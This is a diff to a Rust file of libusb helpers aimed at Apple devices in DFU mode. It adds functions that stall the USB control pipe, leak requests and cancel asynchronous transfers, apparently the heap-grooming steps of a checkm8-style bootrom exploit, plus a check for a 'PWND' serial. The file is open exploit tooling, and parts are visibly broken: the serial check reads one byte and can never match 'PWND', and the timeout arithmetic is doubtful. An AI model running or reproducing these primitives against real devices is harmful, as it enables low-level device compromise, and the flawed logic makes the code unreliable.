@@ -1,29 +1,96 @@
-use std::{thread::sleep, time::{Duration, SystemTime, UNIX_EPOCH}};
-use libusb1_sys::{libusb_fill_control_setup, libusb_fill_control_transfer, libusb_alloc_transfer, libusb_open_device_with_vid_pid, libusb_transfer, libusb_submit_transfer, libusb_cancel_transfer, libusb_control_transfer};
-use rusb::{Context, UsbContext, DeviceHandle};
+use std::{thread::sleep, time::{Duration, SystemTime, UNIX_EPOCH}, ptr::NonNull};
+use libusb1_sys::{libusb_fill_control_setup, libusb_fill_control_transfer, libusb_alloc_transfer, libusb_open_device_with_vid_pid, libusb_transfer, libusb_submit_transfer, libusb_cancel_transfer, libusb_control_transfer, libusb_init, libusb_get_device, libusb_claim_interface, libusb_get_device_descriptor, libusb_device_descriptor, libusb_get_string_descriptor_ascii, libusb_device_handle};
+use rusb::{DeviceHandle, Context, DeviceList};
 
 extern "system" fn _dummy(_: *mut libusb_transfer) {}
 
-pub fn usb_req_leak() {
+pub fn is_pwn_dfu(dev: *mut libusb_device_handle) -> bool {
+    let mut serialnumber: u8 = 0;
+    let mut desc: libusb_device_descriptor = unsafe { std::mem::zeroed() };
     unsafe {
-        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), 0x5ac , 0x1227);
+        let device = libusb_get_device(dev);
+        let _r = libusb_get_device_descriptor(device, &mut desc);
+        let _r = libusb_get_string_descriptor_ascii(dev, desc.iSerialNumber, &mut serialnumber, 1);
+        println!("SerialNumber: {}", serialnumber);
+        if serialnumber.to_string().contains("PWND") {
+            return true
+        } else {
+            return false
+        }
+    }
+}
+
+pub fn aquire_device(vid: u16, pid: u16) -> *mut libusb_device_handle {
+    unsafe {
+        let mut desc: libusb_device_descriptor = std::mem::zeroed();
+        let mut r = -1;
+        libusb_init(std::ptr::null_mut());
+
+        //let dev = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid, pid);
+        for device in DeviceList::new().unwrap().iter() {
+            let device_desc = match device.device_descriptor() {
+                Ok(d) => d,
+                Err(_) => continue,
+            };
+            if device_desc.vendor_id() == 0x5ac {
+                println!("vid match");
+            }
+            if device_desc.product_id() == 0x1227 {
+                println!("pid match");
+            }
+            
+        }
+        let dev = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid, pid);
+        sleep(Duration::from_secs(1));
+
+        let device1 = libusb_get_device(dev);
+
+        //r = libusb_claim_interface(dev, 0);
+        //if r < 0 {
+        //    panic!("libusb_claim_interface error")
+        //}
+
+        r = libusb_get_device_descriptor(device1, &mut desc);
+        if r < 0 {
+            panic!("libusb_get_device_descriptor error");
+        }
+
+        let mut serialnumber: u8 = 0;
+        r = libusb_get_string_descriptor_ascii(dev, desc.iSerialNumber, &mut serialnumber, 1);
+        if r < 0 {
+            panic!("libusb_get_string_descriptor_ascii error");
+        }
+        return dev
+    }
+}
+
+pub fn usb_req_stall(vid: u16, pid: u16) {
+    unsafe {
+        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
+        libusb_control_transfer(han, 0x2, 3, 0x0, 0x80, std::ptr::null_mut(), 0, 10);
+    }
+}
+
+pub fn usb_req_leak(vid: u16, pid: u16) {
+    unsafe {
+        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
         let mut buf: [u8; 0x40] = [0; 0x40];
         libusb_control_transfer(han, 0x80 , 6, 0x304, 0x40A, buf.as_mut_ptr(), 0x40, 1);
     }
 }
 
-pub fn usb_no_leak() {
+pub fn usb_no_leak(vid: u16, pid: u16) {
     unsafe {
-        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), 0x5ac , 0x1227);
+        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
         let mut buffer_size: [u8; 0xc1] = [0; 0xc1];
         libusb_control_transfer(han, 0x80, 6, 0x304, 0x40A, buffer_size.as_mut_ptr(), 0xC1, 1);
     }
 }
 
-pub fn usb_stall() {
+pub fn usb_stall(vid: u16, pid: u16) {
     let buffer_size: usize = 0xC0;
     let buf: Vec<u8> = vec![b'A'; buffer_size];
-    async_ctrl_transfer( 0x80, 6, 0x304, 0x40A, &buf, 0xC0, 0.00001)
+    let _ret = async_ctrl_transfer( 0x80, 6, 0x304, 0x40A, &buf, 0xC0, 0.00001, vid, pid);
 }
 
 fn get_nanos() -> u64 {
@@ -32,24 +99,36 @@ fn get_nanos() -> u64 {
     since_epoch.as_secs() * 1_000_000_000 + since_epoch.subsec_nanos() as u64
 }
 
-fn async_ctrl_transfer(bm_request_type: u8, b_request: u8, w_value: u16, w_index: u16, data: &[u8], w_length: u16, timeout: f32) {
+pub fn async_ctrl_transfer(bm_request_type: u8, b_request: u8, w_value: u16, w_index: u16, data: &[u8], w_length: u16, timeout: f32, vid: u16, pid: u16) -> i32 {
     let start = get_nanos();
     let mut buffer = vec![0; w_length as usize + 8];
     buffer[8..].copy_from_slice(data);
     unsafe {
-        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), 0x5ac , 0x1227);
+        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
         libusb_fill_control_setup(buffer.as_mut_ptr(), bm_request_type, b_request, w_value, w_index, w_length);
         let transfer = libusb_alloc_transfer(0);
         libusb_fill_control_transfer(transfer, han, buffer.as_mut_ptr(), _dummy, std::ptr::null_mut(), 0);
-        let _ret = libusb_submit_transfer(transfer);
+        let ret = libusb_submit_transfer(transfer);
+        if ret != 0 {
+            return -1
+        }
         while get_nanos() as f32 - (start as f32) < (timeout * (10.0 * 6.0)) {}
-        let _ret = libusb_cancel_transfer(transfer);
+        let ret = libusb_cancel_transfer(transfer);
+        if ret != 0 {
+            return -1
+        } else {
+            return 0
+        }
     }
 }
 
-pub fn reconnect_device(context: &Context, dev: &mut DeviceHandle<Context>, vid: u16, pid: u16, timer: Duration) -> Option<DeviceHandle<rusb::Context>> {
+pub fn reconnect_device(bad_handle: NonNull<libusb_device_handle>, vid: u16, pid: u16, timer: Duration) -> *mut libusb_device_handle {
     println!("Reconnecting device...");
-    dev.release_interface(0).expect("Unable to release device.");
+    unsafe {
+        let normal_handle = Context::new().unwrap();
+        let mut normal_handle = DeviceHandle::<rusb::Context>::from_libusb(normal_handle, bad_handle);
+        normal_handle.release_interface(0).expect("Unable to release device.");
+    }
     sleep(timer);
-    return context.open_device_with_vid_pid(vid, pid)
+    return aquire_device(vid, pid)
 }
